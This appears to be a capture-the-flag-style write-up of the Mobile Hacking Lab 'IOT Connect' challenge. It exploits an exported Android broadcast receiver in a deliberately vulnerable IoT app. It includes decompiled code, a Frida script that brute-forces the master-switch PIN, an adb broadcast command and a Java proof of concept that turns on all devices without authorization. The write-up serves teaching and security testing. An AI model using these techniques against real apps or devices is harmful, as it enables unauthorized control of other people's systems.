---
title: IOT Connect - Mobile Hacking Lab
date: 2025-2-20 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, android]     # TAG names should always be lowercase
---



<br />

### Introduction

Welcome to the "IOT Connect" Broadcast Receiver Exploitation Challenge! Immerse yourself in the world of cybersecurity with this hands-on lab. This challenge focuses on exploiting a security flaw related to the broadcast receiver in the "IOT Connect" application, allowing unauthorized users to activate the master switch, which can turn on all connected devices. The goal is to send a broadcast in a way that only authenticated users can trigger the master switch.

<br />

### Objective

Exploit a Broadcast Receiver Vulnerability: Your mission is to manipulate the broadcast receiver functionality in the "IOT Connect" Android application, allowing you to activate the master switch and control all connected devices. The challenge is to send a broadcast in a way that is not achievable by guest user.









Create a new user account in the application.

![](/assets/img/mhl/IOTConnect/1.png)





We confirm that the **guest login** is successful through the Toast message: **"Welcome, Guest!"**

The interface displays **two buttons**: **Setup** and **Master Switch**.

Clicking the **Setup** button reveals **six sections**: **Fans**, **AC**, **Bulbs**, **Speaker**, **TV**, and **Smart Plug**.





With the guest account, we successfully managed to activate the **Fans**.



![](/assets/img/mhl/IOTConnect/2.png)



When attempting to activate the TV, a Toast message appears saying: “Sorry, guests are not allowed to control the TV.”



![](/assets/img/mhl/IOTConnect/3.png)





 The Master Switch:

When I entered **123**, a Toast message appears saying: “Sorry, the master switch can’t be controlled by guests.”

![](/assets/img/mhl/IOTConnect/4.png)











**Analyzing the application with JADX.**



From: AndroidManifest.xml

```xml
<activity
    android:name="com.mobilehackinglab.iotconnect.CommunicationManager"
    android:exported="false"/>
<activity
    android:name="com.mobilehackinglab.iotconnect.MasterSwitchActivity"
    android:exported="false"/>
<activity
    android:name="com.mobilehackinglab.iotconnect.HomeActivity"
    android:exported="false"/>
<activity
    android:theme="@style/Theme.IOTConnect"
    android:name="com.mobilehackinglab.iotconnect.IoTNavigationActivity"
    android:exported="false"/>
<activity
    android:name="com.mobilehackinglab.iotconnect.LoginActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<activity
    android:name="com.mobilehackinglab.iotconnect.SignupActivity"
    android:exported="true"/>
<activity
    android:name="com.mobilehackinglab.iotconnect.MainActivity"
    android:exported="true"/>
<receiver
    android:name="com.mobilehackinglab.iotconnect.MasterReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="MASTER_ON"/>
    </intent-filter>
</receiver>
```

**`<receiver>`**:

- Declares a broadcast receiver component that listens for system-wide or app-specific broadcast messages.

**`android:name="com.mobilehackinglab.iotconnect.MasterReceiver"`**:

- This specifies the **class name** of the receiver that will handle the broadcast.
- The **MasterReceiver** class will be triggered when the registered broadcast is sent.

**`android:enabled="true"`**:

- This means the receiver is active and can receive broadcasts.

**`android:exported="true"`**:

- This makes the receiver **accessible to other applications** or system services.
- It can **receive broadcasts from any app**, which makes it vulnerable to **Broadcast Injection attacks** if not properly secured.

**`<intent-filter>`**:

- Specifies which **broadcast actions** this receiver is listening for.

**`<action android:name="MASTER_ON"/>`**:

- This means the receiver will listen for the **"MASTER_ON"** custom broadcast action.







From: com.mobilehackinglab.iotconnect.MasterSwitchActivity

```java
    public static final void onCreate$lambda$0(User user, MasterSwitchActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(user, "$user");
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        if (user.isGuest() != 1) {
            EditText editText = this$0.pin_edt;
            if (editText == null) {
                Intrinsics.throwUninitializedPropertyAccessException("pin_edt");
                editText = null;
            }
            String pinText = StringsKt.trim((CharSequence) editText.getText().toString()).toString();
            if (pinText.length() > 0) {
                int pin = Integer.parseInt(pinText);
                Intent intent = new Intent("MASTER_ON");
                intent.putExtra("key", pin);
                LocalBroadcastManager.getInstance(this$0).sendBroadcast(intent);
                return;
            }
            Toast.makeText(this$0, "Please enter a PIN", 0).show();
            return;
        }
        Toast.makeText(this$0, "Sorry, the masterswitch can't be controlled by guests", 0).show();
    }
```

If the user is logged in as a **guest**, the Toast message **"Sorry, the masterswitch can't be controlled by guests"** will be displayed. Since we are using a guest account, this message will **always appear**, preventing us from controlling the **Master Switch**.





From: defpackage.Checker

```java
public final class Checker {
    public static final Checker INSTANCE = new Checker();
    private static final String algorithm = "AES";
    private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";

    private Checker() {
    }

    public final boolean check_key(int key) {
        try {
            return Intrinsics.areEqual(decrypt(ds, key), "master_on");
        } catch (BadPaddingException e) {
            return false;
        }
    }

    public final String decrypt(String ds2, int key) {
        Intrinsics.checkNotNullParameter(ds2, "ds");
        SecretKeySpec secretKey = generateKey(key);
        Cipher cipher = Cipher.getInstance(algorithm + "/ECB/PKCS5Padding");
        cipher.init(2, secretKey);
        if (Build.VERSION.SDK_INT >= 26) {
            byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2));
            Intrinsics.checkNotNull(decryptedBytes);
            return new String(decryptedBytes, Charsets.UTF_8);
        }
        throw new UnsupportedOperationException("VERSION.SDK_INT < O");
    }

    private final SecretKeySpec generateKey(int staticKey) {
        byte[] keyBytes = new byte[16];
        byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8);
        Intrinsics.checkNotNullExpressionValue(staticKeyBytes, "getBytes(...)");
        System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));
        return new SecretKeySpec(keyBytes, algorithm);
    }
}
```

The **`Checker`** class is responsible for validating the PIN used to activate the **Master Switch** functionality in the application. This class uses **AES (Advanced Encryption Standard)** encryption in **ECB (Electronic Codebook)** mode with **PKCS5 padding** to decrypt a hardcoded **Base64-encoded** string (**`ds`**) that represents the secret keyword **"master_on"**. The validation process works as follows:

1. The **`check_key(int key)`** method is called, which takes an integer PIN as input.
2. It then calls the **`decrypt()`** method, passing the Base64-encoded secret string **`ds`** along with the user-provided PIN.
3. Inside the **`decrypt()`** method, the **AES** cipher is initialized with the provided **PIN** as the encryption key using the **ECB/PKCS5Padding** algorithm.
4. The **PIN** is first converted into a string, then to a byte array, and padded to a fixed length of **16 bytes** using the **`generateKey()`** method.
5. The **`generateKey()`** method uses the PIN to create a **SecretKeySpec** object, which is the cryptographic key needed to decrypt the secret string.
6. The Base64-encoded string is decoded into bytes and decrypted using the cipher.
7. If the decrypted result is equal to the string **"master_on"**, the **`check_key()`** method will return **`true`**, confirming the PIN is correct.
8. If the decryption fails or the result is not **"master_on"**, the method will return **`false`**.





From: com.mobilehackinglab.iotconnect.CommunicationManager

```java
    public final BroadcastReceiver initialize(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        masterReceiver = new BroadcastReceiver() { // from class: com.mobilehackinglab.iotconnect.CommunicationManager$initialize$1
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context2, Intent intent) {
                if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, "MASTER_ON")) {
                    int key = intent.getIntExtra("key", 0);
                    if (context2 != null) {
                        if (Checker.INSTANCE.check_key(key)) {
                            CommunicationManager.INSTANCE.turnOnAllDevices(context2);
                            Toast.makeText(context2, "All devices are turned on", 1).show();
                        } else {
                            Toast.makeText(context2, "Wrong PIN!!", 1).show();
                        }
                    }
                }
            }
        };
        BroadcastReceiver broadcastReceiver = masterReceiver;
        if (broadcastReceiver == null) {
            Intrinsics.throwUninitializedPropertyAccessException("masterReceiver");
            broadcastReceiver = null;
        }
        context.registerReceiver(broadcastReceiver, new IntentFilter("MASTER_ON"));
        BroadcastReceiver broadcastReceiver2 = masterReceiver;
        if (broadcastReceiver2 != null) {
            return broadcastReceiver2;
        }
        Intrinsics.throwUninitializedPropertyAccessException("masterReceiver");
        return null;
    }
```

The **`masterReceiver`** component in the application is a **broadcast receiver** that listens for system-wide messages with the action **`MASTER_ON`**. When this action is received, the receiver extracts a numeric PIN from the broadcast message using the key parameter **`key`**. The extracted PIN is then verified using the **`Checker.check_key()`** method to determine whether the provided PIN is correct. If the PIN is valid, the application triggers the **`turnOnAllDevices()`** method, which activates all smart devices connected to the system, such as fans, bulbs, AC, and more. Additionally, a **Toast message** appears confirming that all devices have been turned on. However, if the PIN is incorrect, the application displays a message saying **“Wrong PIN!!”**. Since the **broadcast receiver** is marked as **exported** in the manifest file, this makes the component accessible to external applications or system commands. This means an attacker can exploit this functionality by manually sending a broadcast message using tools like **ADB** or **Frida**









**Bruteforce the key with frida**

```javascript
Java.perform(function() {
        Java.choose('Checker',{
        // If an instance has been found
        onMatch: function(instance) {
                for(let i = 0;i<1000;i++){
                    let key = i.toString().padStart(3, '0');
                    if(instance.check_key(parseInt(key))){
                        console.log("[+] key: " + key);
                    }
                }
        },
        // Done scanning app memory
        onComplete: function() {
            send("Done scanning the app memory");
        }
    });
});
```

The key is 345



**adb**

Send the broadcast receiver with the correct key

```bash
adb shell am broadcast -a MASTER_ON --ei key 345
```



**Android app PoC**

```java
Intent intent = new Intent("MASTER_ON");
intent.putExtra("key", 345);
sendBroadcast(intent);
```



**Exploit the broadcast receiver from our malicious android app**

![](/assets/img/mhl/IOTConnect/5.png)



**Now All devices are turned on**

![](/assets/img/mhl/IOTConnect/6.png)
